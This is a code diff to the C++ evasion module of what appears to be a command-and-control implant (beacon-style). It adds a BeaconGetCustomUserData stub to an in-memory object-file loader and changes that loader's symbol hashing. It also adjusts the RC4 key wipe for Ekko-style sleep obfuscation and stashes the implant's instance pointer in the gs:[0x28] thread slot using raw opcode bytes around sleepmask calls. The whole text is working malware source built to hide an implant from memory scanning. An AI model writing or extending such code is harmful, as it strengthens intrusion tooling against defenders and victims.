@@ -360,6 +360,22 @@ static BOOL __cdecl declfn sm_beacon_get_syscall_stub( void*, SIZE_T, BOOL ) {
     return FALSE;
 }
 
+static char* __cdecl declfn sm_beacon_get_custom_user_data() {
+#ifdef _WIN64
+    void* result;
+    __asm__ volatile (
+        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
+        : "=a"(result)
+    );
+    auto inst = static_cast<instance*>( result );
+    if ( !inst || !inst->evasion.udrl_user_data ) return nullptr;
+    auto ud = reinterpret_cast<USER_DATA*>( inst->evasion.udrl_user_data );
+    return ud->custom;
+#else
+    return nullptr;
+#endif
+}
+
 static auto declfn sm_resolve_symbol(
     instance& inst, const char* name
 ) -> void* {
@@ -395,9 +411,15 @@ static auto declfn sm_resolve_symbol(
         }
     } else {
         uint32_t h = 2166136261u;
-        for ( const char* p = n; *p; p++ ) { h ^= (uint8_t)*p; h *= 16777619u; }
+        for ( const char* p = n; *p; p++ ) {
+            uint8_t b = (uint8_t)*p;
+            if ( b >= 'a' ) b -= 0x20;
+            h ^= b; h *= 16777619u;
+        }
         if ( h == expr::hash_string( "BeaconGetSyscallInformation" ) )
             return (void*)sm_beacon_get_syscall_stub;
+        if ( h == expr::hash_string( "BeaconGetCustomUserData" ) )
+            return (void*)sm_beacon_get_custom_user_data;
     }
 
     DBG_PRINT( inst, "sm_coff: unresolved: %s\n", name );
@@ -764,7 +786,7 @@ auto declfn evasion_on_cleanup( instance& inst ) -> void {
     spoof_cleanup( inst );
 #endif
 
-    for ( uint32_t i = 0; i < inst.evasion.syscall_count; i++ ) {
+    for ( uint32_t i = 0; i < 16; i++ ) {
         inst.evasion.ekko.rc4_key[i] = 0;
     }
     inst.evasion.ekko.initialized = false;
@@ -951,8 +973,29 @@ auto declfn evasion_beacon_gate_call(
             sm_suspend_threads( inst );
         }
 
+        void* old_aup_gate;
+        __asm__ volatile (
+            ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
+            : "=a"(old_aup_gate)
+        );
+        {
+            register void* val __asm__("rcx") = reinterpret_cast<void*>( &inst );
+            __asm__ volatile (
+                ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
+                :: "c"(val) : "memory"
+            );
+        }
+
         auto fn = reinterpret_cast<SLEEPMASK_ENTRY>( inst.evasion.sleepmask_vs.entry );
         fn( &info, &call );
+
+        {
+            register void* val __asm__("rcx") = old_aup_gate;
+            __asm__ volatile (
+                ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
+                :: "c"(val) : "memory"
+            );
+        }
 
         if ( mask ) {
             DWORD coff_restore = 0;
@@ -1047,8 +1090,29 @@ auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> v
 #endif
         sm_suspend_threads( inst );
 
+        void* old_aup_sleep;
+        __asm__ volatile (
+            ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
+            : "=a"(old_aup_sleep)
+        );
+        {
+            register void* val __asm__("rcx") = reinterpret_cast<void*>( &inst );
+            __asm__ volatile (
+                ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
+                :: "c"(val) : "memory"
+            );
+        }
+
         auto fn = reinterpret_cast<SLEEPMASK_ENTRY>( inst.evasion.sleepmask_vs.entry );
         fn( &info, &call );
+
+        {
+            register void* val __asm__("rcx") = old_aup_sleep;
+            __asm__ volatile (
+                ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
+                :: "c"(val) : "memory"
+            );
+        }
 
         DWORD coff_restore = 0;
         inst.kernel32.VirtualProtect(
